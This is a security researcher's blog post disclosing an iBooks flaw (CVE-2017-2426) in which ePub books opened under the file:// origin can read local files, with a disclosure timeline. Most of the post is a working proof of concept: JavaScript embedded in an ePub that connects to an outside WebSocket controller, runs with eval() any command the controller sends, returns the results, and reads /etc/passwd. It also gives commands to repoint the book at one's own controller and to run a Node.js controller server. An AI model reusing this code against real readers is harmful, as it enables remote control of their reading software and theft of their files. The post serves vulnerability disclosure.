---
layout: post
title:  "This book reads you - using JavaScript"
date:   2017-03-27 12:00:00
categories: ibooks epub
---

> "Yes, books are dangerous. They should be dangerous - they contain ideas." - Pete Hautman

On a previous post about ePub parsers ([This book reads you - exploiting services and readers that support the ePub book format](/epub/2017/01/25/This-book-reads-you.html)), I mentioned using scripting capabilities in ePub to perform local attacks against users. 

Apple just released a fix for one issue I reported last year in iBooks that allowed access to files on a users system when a book was opened. iBooks on El Capitan would open an ePub using the file:// origin, which would allow an attacker to access the users file system when they opened a book. ([CVE-2017-2426](https://support.apple.com/en-us/HT207615))

To help demonstrate how this could be used to perform attacks against users, I added a WebSocket client to a book, so that all users who open the  book will connect back to a WebSocket controller server that will feed them arbitrary instructions. The WebSocket client in the ePub will allow access as long as the user has the book open (expectation is that it could be open for a long time, if the user is provided with something worth reading).

eg., Sending a book to a user:
![Image](/assets/ibooks/email.png)

iBooks connects to the WebSocket Controller when opening the book:
![Image](/assets/ibooks/ibooks.png)

iBooks connecting back to a WebSockets Controller. Local files can be retrieved if the reader is vulnerable to CVE-2017-2426 (file:// origin):
![Image](/assets/ibooks/controller.png)

Video demo of how this works (trying to type with one hand):

<p><iframe src="https://player.vimeo.com/video/210000247" width="640" height="360" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe></p>

This is the POC book if you want to try it yourself. You can open it in a reader like Apple iBooks or Adobe Digital Editions. 

<a href="/assets/controller/POC.epub">![Image](/assets/ibooks/ibooksico.png)</a>

Disclaimer: The POC connects to my controller, but I promise not to do anything bad. 😉

#### To modify it to point to your own controller:

* __curl https://s1gnalcha0s.github.io/assets/controller/POC.epub -o poc.epub__

* __unzip poc.epub; rm poc.epub__

eg., contents of poc.epub/EPUB/js/main.js 
{% highlight javascript %}
WebSocketController = 'ws://websocket-controller.herokuapp.com:80';

var socket = new WebSocket(WebSocketController, 'echo-protocol');
socket.onopen = function(evt) { onopen() };
socket.onmessage = function(msg) { onmessage(msg) };
socket.onclose = function(evt) { onerror() }

function onopen()
{
  message('Connected to WebSocket Controller: ' + WebSocketController);
}

function onerror()
{
  message('Unable to connect to WebSocket Controller: ' + WebSocketController);
}

function onmessage(msg)
{
  //just eval anything sent from the controller
  response = eval(msg.data);

  //send response back to controller
  socket.send(response);
}

function get(loc) {
  var xmlhttp = new XMLHttpRequest();
  xmlhttp.open('GET', 'file://' + loc,false);
  xmlhttp.send();
  
  //populate the message element
  message(xmlhttp.responseText);

  return xmlhttp.responseText;
}

function message(message) {
  document.getElementById("message").innerText = message;
  return message;
}

function showExfil() {
  get('/etc/passwd');
}
{% endhighlight %}

* __zip -r poc.epub *__

#### Node.js WebSocket Controller:

* curl https://s1gnalcha0s.github.io/assets/controller/server.js -o server.js
* npm install websocket
* node server.js

Disclosure timeline stuff:

* Dec 2016: Reported to Apple.
* Mar 2017: Fix release, and this post.

Shoutouts:

[@shhnjk](https://twitter.com/shhnjk) reported CVE-2017-2426 as well around the same time 👍. 
<br>[@mccabe615](https://twitter.com/mccabe615) ran a POC to help me confirm some issues independently. 

Thanks for reading. 👋 

[@craig](https://twitter.com/craig_arendt)